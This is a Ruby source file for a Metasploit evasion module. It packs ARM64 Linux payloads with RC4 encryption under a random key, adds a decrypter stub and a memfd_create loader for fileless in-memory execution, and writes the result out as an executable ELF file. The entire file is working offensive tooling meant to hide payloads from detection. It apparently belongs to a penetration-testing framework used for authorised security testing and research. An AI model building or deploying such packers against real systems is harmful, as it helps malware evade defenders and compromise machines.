##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Evasion

  include Msf::Payload::Linux::Aarch64::Rc4Decrypter
  include Msf::Payload::Linux::Aarch64::ElfLoader

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'           => 'Linux ARM64 RC4 Packer with In-Memory Execution',
        'Description'    => %q{
          This evasion module packs ARM64 Linux payloads using RC4 encryption
          and executes them from memory using memfd_create for fileless execution.
          
          Features:
          - RC4 encryption with configurable key size
          - Fileless execution via memfd_create
        },
        'Author'         => ['Massimo Bertocchi'],
        'License'        => MSF_LICENSE,
        'Platform'       => 'linux',
        'Arch'           => [ARCH_AARCH64],
        'Targets'        => [['Linux ARM64/AArch64', {}]],
        'DefaultTarget'  => 0
      )
    )

    register_options([
      OptString.new('FILENAME', [true, 'Output filename', 'payload.elf']),
      OptInt.new('KEY_SIZE', [true, 'RC4 key size in bytes (1-256)', 32]),
    ])
  end

  def run
    
    raw_payload = payload.encoded
    unless raw_payload && raw_payload.length > 0
      fail_with(Failure::BadConfig, "Failed to generate payload")
    end
            
    key_size = datastore['KEY_SIZE']
    if key_size < 1 || key_size > 256
      fail_with(Failure::BadConfig, "KEY_SIZE must be between 1 and 256")
    end
    

    loader_parts = []
    
    key = Rex::Text.rand_text(key_size)
    encrypted = Rex::Crypto::Rc4.rc4(key, raw_payload)

    rc4_stub = Msf::Payload::Linux::Aarch64::Rc4Decrypter.instance_method(:generate).bind(self).call(
        key: key,
       data: encrypted
    )
    loader_parts << rc4_stub
    
    memfd_loader = Msf::Payload::Linux::Aarch64::ElfLoader.instance_method(:in_memory_load).bind(self).call(encrypted)
    loader_parts << memfd_loader
    
    complete_loader = loader_parts.join

    final_elf = Msf::Util::EXE.to_linux_aarch64_elf(framework, complete_loader)

    filename = datastore['FILENAME']
    File.binwrite(filename, final_elf)
    File.chmod(0755, filename)
  end
end
